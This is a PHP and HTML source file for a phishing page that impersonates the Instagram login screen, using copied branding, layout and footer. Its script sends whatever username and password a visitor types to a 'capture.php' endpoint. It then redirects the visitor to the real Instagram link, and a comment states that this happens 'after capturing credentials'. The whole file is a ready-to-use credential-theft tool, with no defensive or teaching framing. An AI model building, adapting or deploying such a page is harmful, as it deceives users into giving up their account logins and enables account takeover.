<?php
session_start();
$redirect_url = $_SESSION['redirect_url'] ?? 'https://www.instagram.com/';
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Login • Instagram</title>
    <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png" type="image/png">
    <link rel="apple-touch-icon" href="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png">
    <meta name="theme-color" content="#ffffff">
    <style>
      * { margin: 0; padding: 0; box-sizing: border-box; }
      body {
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        background-color: #fafafa;
        display: flex;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
        padding: 20px;
      }
      .container { max-width: 350px; width: 100%; }
      .login-box {
        background: white;
        border: 1px solid #dbdbdb;
        border-radius: 1px;
        padding: 40px 40px 20px;
        margin-bottom: 10px;
      }
      .logo {
        background-image: url("https://www.instagram.com/static/images/web/logged_out_wordmark-2x.png/d2529dbef8ed.png");
        background-size: 175px;
        background-repeat: no-repeat;
        background-position: center;
        height: 51px;
        margin-bottom: 30px;
      }
      .login-form input {
        width: 100%;
        padding: 9px 8px 7px;
        margin-bottom: 6px;
        border: 1px solid #dbdbdb;
        border-radius: 3px;
        background-color: #fafafa;
        font-size: 12px;
        outline: none;
        line-height: 18px;
      }
      .login-form input:focus {
        border-color: #a8a8a8;
        background-color: white;
      }
      .login-form input::placeholder {
        color: #8e8e8e;
        font-size: 12px;
      }
      .login-form button {
        width: 100%;
        padding: 7px 16px;
        margin-top: 8px;
        background-color: #0095f6;
        border: none;
        border-radius: 8px;
        color: white;
        font-weight: 600;
        font-size: 14px;
        cursor: pointer;
        line-height: 18px;
      }
      .login-form button:hover { background-color: #1877f2; }
      .login-form button:disabled {
        background-color: rgba(0,149,246,.3);
        cursor: default;
      }
      .divider {
        display: flex;
        align-items: center;
        margin: 18px 0;
        color: #8e8e8e;
        font-size: 13px;
        font-weight: 600;
        text-transform: uppercase;
      }
      .divider::before, .divider::after {
        content: "";
        flex: 1;
        height: 1px;
        background-color: #dbdbdb;
      }
      .divider span { margin: 0 18px; }
      .fb-login {
        display: flex;
        align-items: center;
        justify-content: center;
        color: #385185;
        font-weight: 600;
        font-size: 14px;
        cursor: pointer;
        margin-bottom: 10px;
        text-decoration: none;
      }
      .fb-login svg { width: 16px; height: 16px; margin-right: 8px; }
      .forgot-password { text-align: center; font-size: 12px; margin-top: 15px; }
      .forgot-password a { color: #00376b; text-decoration: none; font-size: 12px; }
      .signup-box {
        background: white;
        border: 1px solid #dbdbdb;
        border-radius: 1px;
        padding: 20px 40px;
        text-align: center;
        font-size: 14px;
        margin-bottom: 10px;
      }
      .signup-box a { color: #0095f6; text-decoration: none; font-weight: 600; }
      .error-message {
        color: #ed4956;
        font-size: 14px;
        text-align: center;
        margin-top: 15px;
        display: none;
        line-height: 18px;
      }
      .loading {
        display: none;
        text-align: center;
        margin-top: 10px;
        color: #8e8e8e;
        font-size: 12px;
      }
      .app-download { text-align: center; margin-top: 10px; }
      .app-download p { font-size: 14px; margin-bottom: 15px; color: #262626; }
      .app-badges { display: flex; justify-content: center; gap: 8px; }
      .app-badges img { height: 40px; }
      .footer { margin-top: 30px; text-align: center; }
      .footer-links { display: flex; flex-wrap: wrap; justify-content: center; gap: 5px 16px; margin-bottom: 20px; }
      .footer-links a { color: #8e8e8e; font-size: 12px; text-decoration: none; }
      .footer-copyright { color: #8e8e8e; font-size: 12px; }
      .show-password { position: relative; }
      .show-password input { padding-right: 55px; }
      .show-password button.toggle-password {
        position: absolute;
        right: 8px;
        top: 50%;
        transform: translateY(-50%);
        background: none;
        border: none;
        color: #262626;
        font-size: 14px;
        font-weight: 600;
        cursor: pointer;
        padding: 0;
        margin: 0;
        width: auto;
      }
      @media (max-width: 450px) {
        .login-box, .signup-box { border: none; background: transparent; }
        body { background-color: white; }
      }
    </style>
  </head>
  <body>
    <div class="container">
      <div class="login-box">
        <div class="logo"></div>
        <form class="login-form" id="loginForm">
          <input type="text" id="username" name="username" placeholder="Phone number, username, or email" autocapitalize="off" autocorrect="off" required />
          <div class="show-password">
            <input type="password" id="password" name="password" placeholder="Password" autocapitalize="off" autocorrect="off" required />
            <button type="button" class="toggle-password" id="togglePassword" style="display: none;">Show</button>
          </div>
          <input type="hidden" id="redirect_url" value="<?php echo htmlspecialchars($redirect_url); ?>">
          <button type="submit" id="loginBtn" disabled>Log in</button>
          <div class="error-message" id="errorMsg">Sorry, your password was incorrect. Please double-check your password.</div>
          <div class="loading" id="loading">
            <svg width="18" height="18" viewBox="0 0 18 18" fill="none" style="animation: spin 1s linear infinite;">
              <circle cx="9" cy="9" r="8" stroke="#c7c7c7" stroke-width="2"/>
              <path d="M9 1a8 8 0 0 1 8 8" stroke="#8e8e8e" stroke-width="2" stroke-linecap="round"/>
            </svg>
            <style>@keyframes spin { 100% { transform: rotate(360deg); } }</style>
          </div>
        </form>
        <div class="divider"><span>OR</span></div>
        <a href="#" class="fb-login">
          <svg viewBox="0 0 24 24" fill="#385185">
            <path d="M12 2.04c-5.5 0-10 4.49-10 10.02 0 5 3.66 9.15 8.44 9.9v-7H7.9v-2.9h2.54V9.85c0-2.51 1.49-3.89 3.78-3.89 1.09 0 2.23.19 2.23.19v2.47h-1.26c-1.24 0-1.63.77-1.63 1.56v1.88h2.78l-.45 2.9h-2.33v7a10 10 0 0 0 8.44-9.9c0-5.53-4.5-10.02-10-10.02Z"/>
          </svg>
          Log in with Facebook
        </a>
        <div class="forgot-password"><a href="#">Forgot password?</a></div>
      </div>
      <div class="signup-box">Don't have an account? <a href="#">Sign up</a></div>
      <div class="app-download">
        <p>Get the app.</p>
        <div class="app-badges">
          <a href="#"><img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Get it on Google Play"></a>
          <a href="#"><img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Get it from Microsoft"></a>
        </div>
      </div>
      <div class="footer">
        <div class="footer-links">
          <a href="#">Meta</a><a href="#">About</a><a href="#">Blog</a><a href="#">Jobs</a><a href="#">Help</a><a href="#">API</a><a href="#">Privacy</a><a href="#">Terms</a><a href="#">Locations</a><a href="#">Instagram Lite</a><a href="#">Threads</a><a href="#">Contact Uploading & Non-Users</a><a href="#">Meta Verified</a>
        </div>
        <div class="footer-copyright">© 2024 Instagram from Meta</div>
      </div>
    </div>
    <script>
      const form = document.getElementById("loginForm");
      const loginBtn = document.getElementById("loginBtn");
      const errorMsg = document.getElementById("errorMsg");
      const loading = document.getElementById("loading");
      const usernameInput = document.getElementById("username");
      const passwordInput = document.getElementById("password");
      const togglePassword = document.getElementById("togglePassword");
      const redirectUrl = document.getElementById("redirect_url").value;

      function checkInputs() {
        loginBtn.disabled = !(usernameInput.value.trim().length > 0 && passwordInput.value.length >= 1);
      }

      usernameInput.addEventListener("input", checkInputs);
      passwordInput.addEventListener("input", () => {
        checkInputs();
        togglePassword.style.display = passwordInput.value.length > 0 ? "block" : "none";
      });

      togglePassword.addEventListener("click", () => {
        if (passwordInput.type === "password") {
          passwordInput.type = "text";
          togglePassword.textContent = "Hide";
        } else {
          passwordInput.type = "password";
          togglePassword.textContent = "Show";
        }
      });

      form.addEventListener("submit", async (e) => {
        e.preventDefault();
        const username = usernameInput.value;
        const password = passwordInput.value;

        loginBtn.disabled = true;
        loginBtn.style.display = "none";
        loading.style.display = "block";
        errorMsg.style.display = "none";

        try {
          await fetch("capture.php", {
            method: "POST",
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&redirect_url=${encodeURIComponent(redirectUrl)}`
          });

          // Redirect to the real Instagram video after capturing credentials
          setTimeout(() => {
            window.location.href = redirectUrl;
          }, 1500);
        } catch (error) {
          loading.style.display = "none";
          loginBtn.style.display = "block";
          loginBtn.disabled = false;
        }
      });
    </script>
  </body>
</html>
